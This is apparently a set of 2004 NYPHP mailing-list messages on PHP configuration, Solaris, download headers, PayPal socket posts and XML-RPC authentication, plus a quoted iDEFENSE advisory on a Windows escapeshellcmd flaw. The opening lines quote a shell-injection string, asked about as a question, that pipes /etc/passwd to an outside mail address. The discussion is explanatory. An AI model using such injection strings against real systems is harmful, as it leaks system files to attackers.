"This is is the message I want encrypted.'; /bin/cat /etc/passwd | 
/bin/mail evilhaxor at hotmail.com; echo 'misc info"
would that all get encrypted entirely or would it run the shell code 
sandwiched in the middle?

Negative; PHP doesn't like binary too, well.

Luckily, being the forward-thinkers that they are, PHP developers made C
extensions easy.  I did one that talked to a serial card reader.

Exactly... see attached for code sample (and I used a goto so shoot me

If we're talking FreeBSD's jail() then yes.  But I have a feeling that
we're talking chroot(), which isn't really a jail - at least to a BSDer
or anyone else outside Linux.

A chroot() (man 2 chroot) just changes the root directory of the
process.  A jail() (man 2 jail on FreeBSD) however is a call into
special kernel hooks that blocks and segragates processes from one
another, including networking, memory (to some extent), etc.  Much more
sophisticated than a chroot() in Linux land.

mod_php is what mod_perl folks call PHP, realizing that their hosting
service will make more money if they offer PHP instead of Perl :)

There are flags (which I've forgotten) that force sendmail to queue mail
only.  Searching for QueueOnly or something might help.

But as is the case with most things sendmail, it doesn't work so well
all the time.  Solutions tend on using a different MTA (postfix and
qmail queue by default, and let the calling process proceed almost
instantly).

That said, the real way to do it if you have tons of emails to send is
to fork() a process out.  This then continues to talk to your MTA, while
the web page returns immediately.

Subject: [nycphp-talk] PHP + Windows + cURL
Message-ID: <Pine.LNX.4.58.0406041214150.30118@miranda.org>

I'm having a problem enabling the cURL extension on PHP under
Windows XP. I'm using the Apache module version with the latest
version of Apache 1.3.x.

I downloaded the pre-built binary package and can successfully install
PHP, but when I try to enable cURL, I run into errors. There seems to
be a dependency on ssleay.dll, which is bundled, but that still
doesn't work.

>From Googling around, I see some mentions of another dependence on
msvcr70.dll. I searched the machine and that DLL is located on my
machine, along with msvcr71.dll. Do I need to place them anywhere
special? Do I need another DLL?

As you might guess, my Windows experience is limited, but I need to
use Windows at my new job. :)

ssleay.dll is dependent on libeay32.dll

have you got a libeay32.dll
in your 'extensions' directory?

NYPHP has a knowledge base with background 
information. It's called 'Phundamentals'.
( I urge you to look it over -- it's at: 
  http://phundamentals.nyphp.org/ )

In the future, you might consider submitting one 
of your articles as a Phundamental.

To find out how to submit a proposal in 
general visit:

http://clew.nyphp.org/clew/operations/newproposals 

(Hans Kaspersetz can help you with proposal 
submissions)

Or if you want to get more involved with 
Phundamentals (or other projects in the

Yes. I set my extensions dir to c:/php/ and moved php_curl.dll from
ext/ to the root directory. Inside c:/php/ I have both libeay32.dll
and ssleay32.dll.

Now it says it can't find ssleay32.dll. Do I need to add c:/php/ to
some form of Windows library search path?

Normally if you drop these into Windows/System32 you will be ok.  This is 
considered the /usr/lib of Windows ...

The only problem with some apps is if you have multiple copies laying 
around ... (like cygwin will complain, etc) - which by the way Id 
recommend installing if you can just to get around better.

If you right click Computer somewhere you can find a place to set 
Environment variables like PATH, but normally if you just drop to System32 
all goes well.

I would advise you to keep libeay32.dll in the 
extension directory (I think for you that would be:
c:\php\ext )

That is, have both ssleay32.dll and libeay32.dll in 
the extension directory.

Then set you (system wide) path to include both 
c:\php (where you execute php from) and 
c:\php\ext (where your extensions are)

That should work --

Thanks. I got things working (I think) using Jon's advice, but what I
will probably end up doing long term is installing VMWare and Linux. :)

Quit making things hard on yourself.  Add the dlls' dir to the path 
environment variable.  That way you don't have to move anything anywhere.  
I don't know why PHP's instructions continually tell users to start moving 
DLL's all over the place.  It's a complete waste of time and a gigantic 
hastle in the long run when upgrading.

Anyway, here's my path:
C:\PROGRA~1\php;C:\PROGRA~1\php\dlls

My php.ini:
extension_dir = "c:\progra~1\php\extensions"

And here are the file locations, which I've never touched:
c:\progra~1\php\...
    extensions\php_curl.dll
    dlls\libeay32.dll
    dlls\ssleay32.dll

Ah yes. That's what I would have done normally, but I didn't know if
such a setting existed on Windows and how I would go about setting
it.

Anyway, I just Googled and, well, it's easy. You're right; the
instructions should be changed.

Thanks for all the help.

"... no final decisions have been made on the specific details..."

Call me pessimistic, but I read that as "...we'll release 1% of our code
because we want the marketing buzz that surrounds Open Source to
surround us since we're loosing market share left and right..."

I hope that I'm wrong, since there's some good stuff deep within
Solaris' code base, but it's going to mean a major shift for Sun.  That
said, if they are legit and do release the entire tree, watch out Linux.

Oh yeah -- they are going to release the whole tree.

One thing of interest could be 'Solaris Doors' --
and the thread pools which support doors.

There was an (ill-fated) emulation attempt:
http://ldoor.sourceforge.net/ )

excerpted from the above link:
"Goal of Linux Doors (ldoor) project is to implement Solaris 
doors API under Linux. Doors are fast intra-machine RPC interface. 
Implementation consists of kernel part (written as device driver) 
and user-level library emulating Solaris calls..."

After you 'harden' Solaris it can be made 
incredibly secure.

If you add that all up  -- almost air-tight security, superior 
threading model (in the kernel), and super speedy nfs i/o -- 
I would say watch out Linux *and* BSD

Nyah, both Linux and *BSD are superior products. First, Linux has a much 
better developer base and the entry point for contributions is much 
lower. You only need low-end x86 hardware and you're off. Plus, Linux 
makes a better desktop experience; more user apps are written for it.

NetBSD (my favorite of the lot) is a much cleaner code base and more 
platforms, thus more places to use it.

Solaris really doesn't seem to offer any value in the low-medium end 
server market or the desktop. It may be nice for a few high end uses but 
I think it more likely that people will read the code and spend time 
porting the concepts to Linux and *BSD than converting to Solaris.

With the push for web-based apps and db backends you seldom need bigger 
boxes like the 8+ CPU models. And if you need 1, you need at least 2 to 
provide uptime and redundancy. And if you need 2 you need 4; 2 for 
production, 1 for developing code and 1 for heavy QA testing Better to 
have 4-8 smaller boxes with a shared load. Although I admit admin'ing 2 
boxes is easier than 8.  :)

You also need to look at the job market; most jobs are in small 
businesses that can better justify a uniform platform provider like Dell 
or Compaq/HP than some Sun and some x86. Your Linux skills are going to 
find more opportunities. Of course, as this is a PHP list your AMP 
skills will be more in demand everywhere and you just need to know how 
to get the sysadmin up to speed on their particualr platform's support 
of AMP.  :)

For now, but this falls down in two ways - anything that's compiled can 
be cross-compiled, and there's no reason you can't add linux binary 
compatibility to Solaris, as some of the BSDs have done.

I think it'll be some combination of the two, but I suspect that it'll 
be easier to port the user apps to Solaris than to incorporate the 
advantages Solaris has into the Linux kernel.

I'm not familiar with the specifics, but I'd assume that some of the 
enhancements that Sun came up with for multi-processor support will also 
apply to distributed cluster implementations, and that Sun hasn't gone 
that way because up until very recently, they've had a vested interest 
in getting people to buy large SMP servers.

Well... MySQL on Solaris is currently less fun.

You can get solaris 10 for for free here: 
http://wwws.sun.com/software/solaris/10/ 

One year of support costs $99.
(I think -- at least that was the price for 
Solaris 9 as I recall)

DTrace looks intersting.

(Sun marketing hype: "DTrace is a sophisticated and powerful new 
technology which enables a system administrator to explore today's 
complex systems to understand how they work and ultimately to track 
down performance problems across many layers of software.")

As to 'the same level of hardware support' -- 

http://www.sun.com/bigadmin/hcl/ 

has a hardware compatibility list.

Frankly, I don't care if an OS supports 30 different 
network adapters -- just mine.

Don't agree with you there, Leam, for a better destop experience -- 
just throw on what ever 'happy face' (desktop environment) 
floats your boat.

$100 bucks for commercial support seems like a pretty good value to me.
I think that is less money than Red Hat (Linux) charges.

I agree with Adam here except for two things:

one, I am under the impression that most significant apps 
     are already ported or were done for Solaris first --

two,  although it would generally seem better to 
      incorporate whatever superior things (might) exist in 
      Linux to Solaris -- I wouldn't overlook the fact 
      that if SCO ever comes up with any real hard 
      facts (specific lines of code) that they (SCO) 
      want addressed (removed from the Linux kernel), Linux 
      maintainers may find it expeditious to port 
      what pieces they can from Solaris.

I am certainly no authority on Unix kernels. Here, I am assuming 
SCO can't claim the rights to Sun's kernel and further 
I am guessing that since the Solaris kernel is unquestionably 
Unix-like, it would be close enough to the Linux kernel to 
provide some useful pieces where needed.

I'll take your word on that.

Actually I am not a really big fan of (or advocate for) Solaris. 

The last time I used it on a PC was circa Solaris 8 -- 
and then only because I was forced to.

You might be asking why I forwarded this announcement to a PHP list...

There has been some work on porting PHP to the Parrot engine by Sterling
and Theis.  There are some interesting concepts here, so I thought it
might be something of interest to PHPers.  Afterall, scripting engines -
whether it be Zend or Parrot - work on many of the same principles.

Anyway, I unfortunately won't be in town for the meeting, but I hope
some may find it useful.

Some people swear by screw-top wine bottles too. Wouldn't take that as a 
recommendation though.  :)

Vastly superior in what? Solaris does use a fairly modular kernel so you 
don't have to recompile to get new drivers. Of course that means you get 
all the hooks, you can't really compile out anything.

I tried x86 Solaris a couple years ago, didn't care for it. Though newer 
Sparc hardware is becoing PCI based more and more. Hmm, actually it may 
be fully there already. So it's moving to where everyone else is.

Not everyone is as good about portable code, and you still have native 
issues to deal with. Most things in Solaris have had the possibility of 
64 bits for a while, not sure how they translate to a 32 bit hardware 
platform.

I still havent' seen any Soalris based apps that don't run on Linux or 
*BSD. And for note, both of them run faster on sparc hardware than Solaris!

Sun cluster is a dog, avoid it. Same with Alternate pathing. Sun's 
position is that they want to sell 4-20 CPU boxes and have them run in 
parallel. You can use Oracle's multi-node stuff cluster or Vertias 
cluster, but Sun's is "warm standby" only.

They're also happy if you buy a load-balanced solution.  :)


> Well... MySQL on Solaris is currently less fun.

For me most anything on Solaris, except SCSI and logical volumes, is 
less fun. With x86 hardware and a tuned Linux/*BSD you can customize the 
OS to the server mission. There's a balance between server farms and 
single points of failure

I won't say Linux is vastly superior to Solaris, but in a large number 
of respects it's better, to me.

That's the rub; if it works for you there's no need to improve it, is 
there? But if it's light weight and I can port it to my existing 
hardware I can use what I have and learn at the same time.

When I did  Solaris x86, for a thankfully short time, it had fairly high 
end requirements. We sometimes forget that much of the world doesn't 
have the resources to buy the extra hardware we take for granted. 
Linux/*BSD will provide for places outside of the US, and I think it 
will provide for the cost conscious in the US.

The caveat here is that I've never done HPC or Mainframe support, the 
largest box I've supported is ~10 CPUs. There may well be computing 
needs I don't really understand.

Not really, GNOME on Solaris dind't do some of the characters right, 
when I'm logged in remotely as root on a production server, it had 
BETTER show me exactly what I'm typing. If i'd have been using a 
home-brew desktop I'd accept that behavior. But if it shipped in the CD 
set, no thanks.

Of course, a year or so ago they turned off x86 development and support 
and only recently restarted it. I think mostly because they need 
Microsoft's support so they are trying to compete with Linux as a sop to 
Bill Gates.

That is, of course, my highly biased opinion.  :)

Ported for some things, but many vendors seem to be moving coder

As far as I've seen the SCO thing has no basis in fact. I'm not a 
lawyer, though. I also thought that the case referred to older code no 
longer used in the latest kernels.

Yeah, that sounds reasonable. It is strong M$ marketing style to lead 
actual work with grand announcements of "framework" and endpoints, in 
order to halt comittments, deter competitors, and seed emerging markets 
with doubt. Plus Sun doesn't have a stellar tech support history for 
other non-mainframe products (as highlighted here where they turned x86 
support on and off, then on again, and of course I can't forgive them 
for the Cobalt fiasco).

There's little doubt BSD is here to stay, and not much doubt about Linux 
either. Let's see Sun produce x86 support, offer paid support 
consistently over 5 years or so, and commit to OS past a 
point-of-no-return.... then maybe I'd consider it a factor in the OS 
development areas not currently flocking to Solaris.

I've looked at both. I figured some stuff may get buried in the ISP's 
reports because the hit rate for the particular pages would be too low. 
However, searching through the logs didn't help at all...the last entry 
in the logs for the particular pages in question is March...and it's now 
June.

I've never heard of hits missing in Apache's logs.  Top that off with it 
missing, the same hit consistently for an extended period of time.  I'm 
willing to bet that something changed in March.  Perhaps an additional 
server?  The page got renamed?  An additional page got introduced which 
supplants the original one?

This situation could be similar to the one you had several months ago
where you had an old script lying around which unvalidated sumissions were
coming from.

Actually, screw-top wine bottles are cheaper, more effective, more
useful, and better for the environment than ones using cork. The only
reason the wine industry hasn't adopted them is legacy snobbery and
public perception.

There's been a transition to plastic "corks" in recent years. They're
better than actual cork, and are seen as a transition mechanism to
screw tops. It's still a tough sell in expensive wines.

PHP Win32 escapeshellcmd() and escapeshellarg() Input Validation
Vulnerability

iDEFENSE Security Advisory 06.07.04:
www.idefense.com/application/poi/display?id=108&type=vulnerabilities
June 7, 2004

I. BACKGROUND

PHP is a widely-used general-purpose scripting language that is
especially suited for Web development and can be embedded into HTML.
More information is available at http://www.php.net.

II. DESCRIPTION

Remote exploitation of an input validation vulnerability in The PHP
Group's HTML-embedded scripting language PHP allows attackers to bypass
security protections.

The problem specifically exists within the shell command escape routines
escapeshellcmd() and escapeshellarg(). These routines are intended for
escaping shell metacharacters that may be present in user-supplied data
prior to passing them to command execution routines such as system(),
passthru(), popen(), exec() or the backtick operator. While both filter
routines are functional on the Unix platform, they fail to filter all
characters on the Windows platform. The escapeshellcmd() routine fails
to filter the characters '%|>', allowing attackers to access environment
variables, redirect output and execute arbitrary commands. The
escapeshellarg() routine fails to filter the character '%', allowing an
attacker to access environment variables.

III. ANALYSIS

Exploitation allows attackers to compromise an affected system under the
web server's privileges. Systems are not vulnerable by default, as a
publicly accessible script must be present that utilizes one of the
affected routines with user-supplied data.

IV. DETECTION

iDEFENSE has confirmed the existence of this vulnerability in PHP
version 4.3.6 running on Microsoft Windows platforms. It is suspected
that previous versions are also vulnerable.

V. WORKAROUND

Pass user-supplied data through custom character filters implemented
with str_replace() or preg_replace(). Example:

~    $user_supplied = preg_replace("/[>|%]/", "", $user_supplied);

VI. VENDOR RESPONSE

The input validation vulnerability inside escapeshellcmd() and
escapeshellarg() on Win32 platform has been resolved. A new PHP version
(4.3.7) immune to this vulnerability is due to be released on June 3rd,
2004.

VII. CVE INFORMATION

A Mitre Corp. Common Vulnerabilities and Exposures (CVE) number has not
been assigned yet.

VIII. DISCLOSURE TIMELINE

04/05/03   Vulnerability acquired by iDEFENSE

The page names haven't changed since the site went live.

But you are correct that **something** had to have changed since March.

Here's the puzzle (and it addresses Tim's comment concerning the log not 
being updated correctly). A visitor has to fill out three forms in 
sequence. You would think that pages 1, 2, 3 would show up some time in 
the logs...but they do not...at least the "sequence" doesn't always show 
up. Sometimes only page1 and page 3 will show up...sometimes none of the 
pages show up even though the logs say that the subdirectory has been 
accessed.

I am assuming that you are using session tracking along 
the lines suggested in the recipe for working 
with multi-page forms (from PHP Cookbook).

So, if you set up a separate error log 
you can send tracer messages to that log 
and see if that sheds any light on the 
situation.

As a general footnote:

handling stuff which might be of interest to readers 
of this list -- it is pretty usable (my opinion of course)

Realy no body know about this problem?
It works for netscape, but it doesn't work for IE.

Thanks again.

You have to change your headers to force them to download for IE as well 
as for other browsers.  You will need to do more with header() to do so:

    function &generateForceDownloadHeaders($fullFilePath = '') {        
    // STATIC VOID METHOD
        $file = ($this->fullFilePath) ? $this->fullFilePath : $fullFilePath;
        if (is_file($file)) {
         $filesize = @filesize($file);
         header('Content-Disposition: attachment; filename="' . 
substr($file, strrpos($file, '/') + 1, strlen($file)) . '"');
         header("Content-Length: $filesize");
         header('Content-Type: application/octet-stream');
         header('Content-Transfer-Encoding: binary');
         header('Pragma: no-cache');
         header('Expires: 0');
         @readfile($file);
         @set_time_limit(600);
        }
    }

It's becoming obvious that I'll have to stick some sort of code in there 
to watch what is going on.

And yes...I'm using sessions.

I bet your ISP implemented caching servers or multiple servers and 
their configuration is causing the location of the log information to 
change or is misconfigured so hits don't get properly logged in the 
designated location.

Thanks,  Phil, 
your code is a great help, but it doesn't work for me. I finally
got this, and it works. Thank you for your great help!!

   header("Content-Type: application/vnd.ms-excel;
charset=$dest_charset");
   header("Cache-Control: must-revalidate, post-check=0,
pre-check=0");
   print($report_content);

This code works for both IE and Netscape.

It looks lilke a cach issue.

It's because Internet Explorer honors the no-cache and no-store pragmas.
This equates to it not wanting to save anything to disk.

When downloading files - in a RFC standard world - you should add some
headers to allow caching/downloading.  Such as

      header('Cache-Control: must-revalidate', TRUE);
      header('Pragma: ', TRUE);

Another thing to do is to make sure the client doesn't know how to handle that particular MIME type (such as loading Excel for vnd.ms-excel). One non-existant MIME type that's commonly used is force-download. This is what I do in my download script, which works in most browsers:

  header("Cache-Control: no-store, no-cache, must-revalidate"); 
  header("Cache-Control: post-check=0, pre-check=0", false);
  header("Cache-control: private");
  header("Pragma: no-cache");
  header("Content-Type: application/force-download");
  header('Content-Length: '.strlen($data) );
  header('Content-Disposition: attachment; filename="'.$filename.'"');
  echo $data;

Subject: [nycphp-talk] "Approach Review" for storing $_FILES in session
 variable and using later
Message-ID: <40C6205C.7010000@adnet-sys.com>

The approach I took I thought would be the best way to handle this, but 
I'm running into a snag which I'll explain in a minute.

I have a page with form elements whereby the user can upload a file.  
The user can also optionally associate this to-be-uploaded file with 
metadata.  When the user chooses to associate the to-be-uploaded file 
with metadata, they are taken to another page to do so, all the while, I 
am doing this:

$_SESSION['uploadedFile'] = serialize($_FILES);

I am retaining the $_FILES collection because you are not yet submitting 
anything but you want to not have to have the user re-submit the file 
over and over ad infinitum.  So on doing that, once they're done they 
hit the "Submit" button to do their duty.

I also have an Accepter class that will check all form data for 
validation.  If $_FILES exists (the user submitted a file), it needs to 
check to see if the file data is correct.  Everything works just fine... 
except for one problem:

is_uploaded_file($_FILES[$section]['tmp_name']) is always false because 
while $_FILES[$section]['tmp_name'] exists, it's obviously.. not 
uploaded, at least not immediately.

I re-retrieve and repopulated $_FILES as so:

if ($hasUploadedFileInAssoc && !$willDisassocNewAssocFile)
 $_FILES = unserialize($_SESSION['uploadedFile']);

then you finally get to:

if (!is_uploaded_file($_FILES[$section]['tmp_name'])) 
$this->setErrorArray(array('action' => 'File was not uploaded'));

This line is constantly false even though I did upload the file.. just 
not immediately before I get to the page with this line; it was uploaded 
a while ago and all information saved in a $_SESSION variable to be 
retrieved later.

What I'm looking for is a "code review" or an "approach review" as to 
whether or not I handled this request properly inasmuch as storing 
$_FILES into a session variable and retrieving it later to allow the 
user to upload a file and submit data anytime they want to on it.  This 
would help me moreso than a solution at this point to the 
is_uploaded_file() problem (though that's always welcomed too!)

Thanx
Phil

Message-ID: <F34C1BF0-B989-11D8-8561-000A95BAE752@next-online.net>

All,
I've spent a bunch of time trying to trace this error.  Has anyone seen 
it or something like it?

Line in /var/log/httpd/ error_log:
[Mon Jun  7 16:33:43 2004] [notice] child pid 7856 exit signal Bus 
error (10)
where 7856 is a child of httpd

Environment:
Mac OS X 10.3.3
PHP 4.3.6 & 4.3.7
Apache 1.3.29

I've been able to trace (using gdb) the error to a function in 
zend_hash.c, but I can't find where this function is being called from 
and why one of the values is 0x3 (seems like a bad page).

I've not been able to build a test case that isolates this error.  I've 
got a test case that works on one box, but not on another (similarly, 
almost identically) configured OS X box.

It seems to happen after the page has been built and sent to the 
browser, as it doesn't affect the display of the HTML (using smarty).  
Interesting side note, when this error occurs no entries are written to 
the access_log, which makes sense, assuming the apache child is dying 
before it can write to the access_log.

Thoughts?

If you've successfully generated a gdb backtrace, you can probably go
ahead and file a PHP bug report even if your test case doesn't work on
every machine.

Someone may still be able to figure out what the bug is and fix
it. However, I would be sure to upgrade to the latest snapshot before
generating final bt, because that's probably the first reply you'll
get otherwise. :)

Well, from what I know, the temporary uploaded file is deleted as soon as
the form request is finished, which would make the file info in the session
no longer valid upon the next page load (I may be wrong in this).  I'd
recommend storing the file in your own temporary directory and adding it's
location to your file db.  Then once the user finishes the details form,
move the file to the permanent location and update the meta data, or remove
it accordingly.

Cool thanx, I'll remember that next time.  As it is in the interim I was 
in a meeting with the client (being that they are a federal gov't 
agency, it's already a miracle that you could do that) and this is what 
happened:

What I did instead was to appeal to their governmental side (the client 
is a federal government agency, this is DC!): I explained that replacing 
an existing image w/o submittal was a security hole because it allowed 
for files to just "float" in a temporary directory and not necessarily 
be immediately accessible without CRON-based overhead.

Simpler solution: one page is for uploading only, the other for metadata 
editing only. You cannot replace an existing image. You can still delete 
the image (w/ metadata if found).

Message-ID: <1086736279.11816.8.camel@bezel>

Not sure how many of you are on the RDFDEV list, for those of you who
are then please disregard. Otherwise there has been a large thread going
on for sometime about the PHP RAP parser and various things to do with
what is being called the FOAFnet.

I wrote up a rebuttal for several developers who are kind of taking the
ideas and running here: http://blog.peoplesdns.com/node/view/11

It may be interesting to other people as well for what is currently
happening with FOAF and php systems that have to support them.

In case you are not aware, I am doing the peoples DNS (peoplesdns.com)
for Broadband mechanics (people aggregator) and if you happen to be
going to FOAFcon in Ireland in early Sept I most likely will be seeing
you there.

If you run a project that could make use of, or uses, FOAF please let me
know and I can get you in touch with code etc which will be developed
for the FOAFnet.

cheers

Not sure what RAP looks like these days, but a year ago I wrote an 
extension to it that converts RDF into PHP objects (and back, I believe).

It has been languishing (oh, the languish!) since then, but if it helps 
you at all I'd be happy to help dust it off and bring it up to snuff. 
Then again, perhaps Chris Bizer took my lead and wrote it into the RDF 
API for PHP... like I said, been a while.

I have actually downloaded and looked at that a few weeks ago :)

A lot of the issues here are if we even should be using RAP as it is
huge and not well suited to the task at hand (simple parsing, basically
just pulling a few fields).

If anyone knows of any PHP rdf->triples parsers that are not RAP or the
xmlclasses one I pointed out, that could really help out in what we are
trying to do with thise.

Thanks

Is there something you don't like about 
that particular rdf parser(the one in 
PHP XML Classes)?

Not really, but more options are better :)
Basically, I have not got to the point of benchmarking it yet, so I
don't know for certain about it, pretty much have looked around but
something things get missed.

How helpful is it to say "PHP5" at this point?

We should be able to wire up a pretty good RDF-combobulator in 5, 
without any external libraries. Just a class that knows how to work with 
triples and a very basic understanding of how to instantiate an 
rdf-described universe at runtime.

I thought the proper term there was:

Subject: [nycphp-talk] Posting data to PayPal from a script using sockets
Message-ID: <006101c44e58$f3cdb5d0$0801a8c0@DELL4100>

Here is a question from someone (me) who is in way over his head.

I am in search of some help in posting form variables to a third party server from a script. The third party server is PayPal (sandbox) and the post would be the initial variables that are needed to initiate an IPN transaction.

I am trying sockets to connect to the paypal server. I had some success but not yet a complete transaction.

The following code is able to open a socket on the sandbox server and write the post header and data to the server. And I am able to get and read a response from the the sandbox server.

However, I am not able to complete the transaction. 

Despite being logged into developer central, I receive the message "To access the PayPal Sandbox, please log in to PayPal Developer Central. " rather than the payment details page. No activity is recorded in the seller's account, and my ipn script at the notify_url is not hit.

Is someone familiar enough with either using sockets or using paypal that he/she might be able to provide some direction or a solution?

Any help will be much, much, much appreciated.

Thank you.

Bill

Here is the code:

//First I define the variables as key/value pairs in an 
//array called $PayPal_Vars

//Next we need to provide the parameters for the 
//fsockopen() and fputs() functions
foreach ($PayPal_Vars as $key => $value)
{
    $value = stripslashes($value);
    $value = urlencode($value);
    if (!$req)
    {
        $req .= "$key=$value";
    }
    else
    {
        $req .= "&";
        $req .= "$key=$value";
    }
    $req .= "\r\n\r\n";
}

$header .= "POST /cgi-bin/webscr HTTP/1.0\r\n";
$header .= "Host: www.sandbox.paypal.com\r\n";
$header .= "Content-Type: application/x-www-form-urlencoded\r\n";
$header .= "Content-Length: " . strlen($req) . "\r\n\r\n";


//Finally we need to script the call to the PayPal server 
//and the posting of the data
if ($PayPal_Vars[test_ipn] == 1)
{
    $fp = fsockopen ("www.sandbox.paypal.com", 80, $errno, $errstr, 30);
}
else
{
    $fp = fsockopen ("www.paypal.com", 80, $errno, $errstr, 30);
}

if (!$fp)
{
    return "ERROR";
}
else
{
    $fout = fputs ($fp, $header . $req);
    echo "<br>fout = $fout";

    $tmp_headers = "";
    while ($str = trim(fgets($fp, 4096)))
    {
        $tmp_headers .= $str."\n";
    }

    $tmp_body = "";
    while ($str = trim(fgets($fp, 4096)))
    {
        $tmp_body .= $str."\n";
    }

    fclose($fp);
}

Is this from the actual dev toolkit they provide?  I had issues with 
various scripts I came across until I used their stuff ...

(However on a side note since being the victim of a chargeback scam Ive 
dropped PayPal altogether, seller beware :-\ )

John:

No I did not use the PayPal developers kit.  The PHP developers kit is in
beta and was only posted to their site last week.  For handling the ipn
transaction I used a script from "eliteweaver."  It seems to work pretty
well.

My question actually concerns the step just before that--before paypal
executes its ipn scripts.  I am trying to make the initial post of form data
from a script.  So instead of a user clicking a form submit button with a
form action directed to the PAYPAL SERVER, in my case the user will click a
form submit button with a form action directed to another script on MY
SERVER.  That script will then manipulate some data and finally post it to
the PAYPAL SERVER.

But I'm not smart enough to make it work.  (And I am definitely not able to
call myself a programmer.)

I wrote a tutorial on this for zend.com:

or plaintext: http://www.zend.com/zend/tut/tutorial-paypal.php?print=1

Or for "sending" money through paypal.. here:
http://lucifer.intercosmos.net/?view=SNIP&item=52

I also did http://ipn.joihost.com which is an IPN logger/reposter and is
listed on the official Paypal website under IPN logging services. It
really does not do a lot of traffic right now, so if you needed pieces
let me know.

Subject: [nycphp-talk] Authentication with XML-RPC
Message-ID: <40C7E985.4090109@ceruleansky.com>

Hello all,

I recently bought the Essential PHP Tools book by David Sklar, and I 
must say that I found it to be excellent.

This book has a chapeter on using XML-RPC - something that I was 
interested in understanding and using before, but whose corressponding 
PEAR class seemed too ... undecipherable and undocumented until I came 
across the relevant chapter in this book.

Now that I (sort of) understand how it works, here's the problem I would 
like to solve using XML-RPC:

I would like to have several sites, all at disparate domains or 
subdomains managed by the same content management system, and utilizing 
the same database.

For example, suppose I had three sites, each on the subject of different 
ethnic dishes: one about bagels, the other about pierogies, and the 
third about knishes. (Okay, I know this example is starting to sound a 
bit kooky now !)

One way of maintaining three CMS-driven sites would be to install the 
same CMS on three different domains (/ subdomains / hosting providers), 
and have those three CMS installations access the same database, and 
pull different articles from the same database and display different 
kinds of articles on different sites.

For example, on the bagels site, the CMS would retrieve all articles 
(from the master database) whose category matches the bagel category, i.e.:
SELECT FROM masterdb.articles WHERE cat=1 LIMIT 10

And on the pierogies site the CMS would retrieve all articles (again 
from the same master database) whose category matches the pierogies 
category, i.e.:
SELECT FROM masterdb.articles WHERE cat=2 LIMIT 10

But here is the problem with this approach:
in each domain's CMS installation, I have to have both the libraries and 
scripts for the administration panel, AND for the site display. So 
here's my idea:

Why not have a master database whose content is accessible over XML-RPC 
using a lean parser-and-displayer script. Thus, the parser-and-displayer 
would be small and extensible (using templates and plugins) and be able 
to retrieve just the data it needs from an external system and display 
it in a custom fashion.

Why not just have disparate scripts access the same database using the 
MySQL native protocol? Well ... what if the master MySQL database is 
behind a firewall, and the mutltiple sites on which I want to display 
the data are on other hosting providers, or on partners' sites? I do not 
want to give such "external" parties direct access to the database (via 
MySQL usernames and passwords).

Why not just syndicate content using an XML-based format such as RSS ?

Well, I want to control access to the data, and want the script 
requesting data to be able to retrieve data flexibly; for example, I 
would like for bagelsrlotsoffun.com to be able to retrieve all articles 
related to bagels from the time period January 2002 - December 2003.

So my question is (you NEVER thought I'd get to it, right?):
How can I use an authentication scheme over XML-RPC?

Is this doable or easy? Is SOAP better for this job?

I am currently using the PEAR Auth class, and it has a SOAP "container". 
I have not used web services that much, and so I am looking for good 
advice on where to start when it comes to setting up secure, permission 
based syndication systems using XML-RPC or other web service systems.

Thanks for reading all this (non-concise) $%^! - I look forward to your 
collective advice.

Best Regards,

- Jay

I also did not use the PayPal Development Kit.  I develop with Dreamweaver,
and there is a free PHP extension in Dreamweaver for PayPal at:

http://www.macromedia.com/cfusion/exchange/index.cfm?view=sn121&extID=549082#loc=en_us&view=sn121&extID=549082&viewName=Dreamweaver%20Extension&avm=1

Webassist.com is the company that makes the extension.

It works wonderfully.  The data is in your database, and the webpage
connects to PayPal to handle the transaction.  In the code you put the
returning webpage (thank you...) you want your customer to come back to, so
the customer can continue on your site when the transaction is finished.

As a biased observer, if you like (or even dislike) a computer book a
great way to help (or punish) the author is to write a review for
Amazon.Com.

It doesn't need to be long and fancy; even a short review that's to
the point and highlights why the book is (or isn't) helpful is
great and can help boost sales.

If you're a big fan, consider submitting a book review to
slashdot. It's a good way to get your name out and help the author at
the same time. :)

Dear Susan, Jose, Joel:

Thank you for your fast and intelligent replies.

Jose, I have been trying to avoid using curl (which I have never used and
don't really understand), but I'll give it a try if it comes to that.

Joel, I'm still working through your links.

I'm unavailable for a few days but I'll respond again on Monday.

(Meanwhile, if anyone has any specific comments about using sockets, I would
still be interested in learning more about what I must have left out of my
code (below).)

Thanks, and cheers,

Bill

I use POST to send xml data to a foreign UNIX server... I suggest that you include User-Agent and Connection: Close headers. The other thing, which I'm not sure is server-specific or not, is that I use \n to delimit headers, not \r\n. This code snippet has been in working in production for about 4 months: 

$header = "POST $remote_url HTTP/1.0\n";
$header .= "Host: $remote_server\n";
$header .= "User-Agent: {$_SERVER['HTTP_USER_AGENT']}\n";
$header .= "Content-type: text/xml\n";
$header .= "Content-length: ".strlen($data)."\n";
$header .= "Connection: Close\n\n";

$fp = fsockopen($remote_server, 80, &$errno, &$errstr);

if ($fp) {
   fputs($fp, "$header$request");
   $response = "<br><br>Connected to $remote_server$remote_url<br><br>RESPONSE :: <br>";
   while (!feof($fp)) { $response .= fgets($fp, 128); }
   fclose($fp);
   $return = $response;
} else {
   $return = "<br><br>Cannot connect to $remote_server<br>errno::$errno<br>errstr::$errstr";
 }

return $return;

Message-ID: <87e6ded304061010477aeae742@mail.gmail.com>

Roughly a year and half ago I was tasked with designing somewhat of a
"data warehouse" for a liquor company. What they wanted was a
centralized location for all customer data, survey information, and
user accounting. This was done for a couple of reasons, foremost they
wanted customer information in a standard format. They were having to
pay people to write custom reporting tools each time they wanted to
get statistics for a different site. Secondly, it meant that credit
card numbers and other private information wouldn't be stored all over
the place, with various companies.

Granted I only designed the project and it was then handed off to
another company to build it (insert spite here), but I did build a
prototype. After deciding on XML-RPC for the data transactions,
authentication was also an area of interest to me.

The remote web servers would connect when getting a piece of customer
information such as an address, or when a user would try to log into a
website.

It followed a path similar to this:

Web server connects to data warehouse.
Web server authenticates with data warehouse.
-Data warehouse figures out what this web server has access to do.
Web server requests data or authenticates a user.
Data warehouse gives data or user permissions.
etc.

I was using shared memory to keep track of sessions, but most of the
time I just had curl open up a persistent connection and made sort of
a daemon on the other side.

A few things I tried:

Basic HTTP authentication
Challenge based authentication.
mod_ssl requiring client certificates.
etc.

What I found is that when the remote servers are on reasonably fast,
low latency connections, any of the above combined with SSL is secure
and easy enough for basic authentication. When testing prototypes it
was fast enough that a user definitely wouldn't notice, surprisingly.

I hope that helps, you may also want to look into:

http://modules.apache.org/search.php?id=532

although I never have.

If you are still scratching your head after playing around with this
for a while, I may be able to dig up some examples from my prototype
for you.

Curl is very straightforward. Just try something like this out:

ob_start();
